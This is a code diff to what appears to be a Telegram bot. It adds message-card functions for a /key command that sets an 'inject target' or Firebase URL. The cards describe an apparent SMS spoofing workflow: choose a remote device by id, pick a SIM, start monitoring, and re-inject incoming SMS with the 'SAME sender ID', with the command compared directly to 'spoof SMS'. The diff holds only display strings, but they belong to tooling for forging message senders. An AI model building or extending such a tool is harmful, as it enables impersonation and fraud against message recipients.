@@ -247,13 +247,39 @@ def format_ping_card(latency_ms: int) -> str:
     )
 
 
+def format_key_error_card() -> str:
+    return (
+        "❌ <b>ERROR</b>\n\n"
+        "<pre>"
+        "Usage: /key KEY-XXXX-XXXX-XXXX\n"
+        "Example: /key KEY-BF0U-2LBM-5W6W\n\n"
+        "Or Firebase URL:\n"
+        "/key https://your-app.firebaseio.com\n\n"
+        "This is your inject target (like /mynum for spoof SMS)."
+        "</pre>"
+    )
+
+
 def format_key_set_card(inject_key: str) -> str:
     return (
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
         "Inject Key Set!\n\n"
         f"🔑 Key: {inject_key}\n\n"
-        "Next: /fy &lt;device_id&gt; or /setdevice &lt;id&gt;"
+        "Next: /fy &lt;device_id&gt; → pick SIM → /addchannel → /startmonitor\n"
+        "Incoming SMS will inject with SAME sender ID."
+        "</pre>"
+    )
+
+
+def format_license_key_set_card(firebase_url: str) -> str:
+    return (
+        "✅ <b>SUCCESS</b>\n\n"
+        "<pre>"
+        "License Key Set!\n\n"
+        f"🔑 {firebase_url.upper()}\n\n"
+        "Next: /fy &lt;device_id&gt; → pick SIM → /addchannel → /startmonitor\n"
+        "Incoming SMS will inject with SAME sender ID."
         "</pre>"
     )
 
